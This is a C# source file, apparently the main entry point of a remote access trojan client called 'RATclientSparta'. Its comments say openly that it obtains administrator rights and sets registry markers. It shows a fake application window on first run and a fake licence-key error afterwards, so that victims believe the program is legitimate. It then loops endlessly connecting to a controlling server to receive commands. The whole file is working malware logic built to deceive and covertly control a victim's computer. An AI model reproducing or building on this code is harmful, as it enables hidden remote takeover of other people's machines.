using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Setup.PrivilegeCheck;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SpartaRATclient.Setup.OSType;
using SpartaRATclient;
using System.Net.Sockets;
using RATclientSparta.Server;

namespace RATclientSparta
{
    public class Program
    {
        /// <summary>
        /// RAT Client side program
        /// </summary>
        [STAThread]
        static void Main()
        {

            if (!(RegistryCheck.CheckIfExist("HaveTaskSchedulerItem")))
            {
                if (!(RegistryCheck.CheckIfExist("HaveAdminPrivilege")))
                {
                    if (AdminGet.GetAdmin())
                    {
                        RegistryCreate.Create("OpenedAt", DateTime.Now.ToString());
                        RegistryCreate.Create("OsVersion", OSType.Type());

                        //When program gets privileges it will reopen as admin
                        //So i am closing this app because there is other app opened as admin
                        //I dont want this if to be run next time this program self opening it self, so I'm creating this value
                        RegistryCreate.Create("HaveAdminPrivilege", "");
                        Environment.Exit(0);
                    }
                    else
                    {
                        MessageBox.Show("Error: You must run this app as Administrator.");
                        Environment.Exit(0);
                    }
                }
                else
                    RegistryDelete.DeleteValue("HaveAdminPrivilege");
            }

            OpenGUI();
            ConnectToHost();
        }

        private static void OpenGUI()
        {
            //If "FirstOpen" registry data not exist, its the first time program opened.
            //the Fake GUI will open, only once in life.
            if (!(RegistryCheck.CheckIfExist("FirstOpen")))
            {
                //At the first open a GUI box will be shown because i want
                //Clients to think this is a legit app
                RegistryCreate value = new RegistryCreate();
                RegistryCreate.Create("FirstOpen", "0");
                GUIApp application = new GUIApp();
                new Thread(new ThreadStart(() => { application.ShowDialog(); })).Start();
            }
            else
            {
                //User opened the program again, at this point he will keep thinking app is legit. (Fake error message)
                MessageBox.Show("Error: please enter the key to use this program." + Environment.NewLine + "Error ID: 45771 (No key entered)");
            }
        }

        private static void ConnectToHost()
        {
            while (true)
            {
                //Create Socket values
                System.Net.Sockets.Socket SocketValue = Socket.SocketServer.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                //Connecting to Server
                System.Net.Sockets.Socket SocketConnection = ServerEndpoint.Connect(SocketValue);

                //Calling to an instance constructor
                ServerData Connection = new ServerData(SocketConnection);

                //reading data from server - when connection lost, it will return and then Connect() again (While loop from beginning)
                Connection.Receive();
            }
        }
    }
}
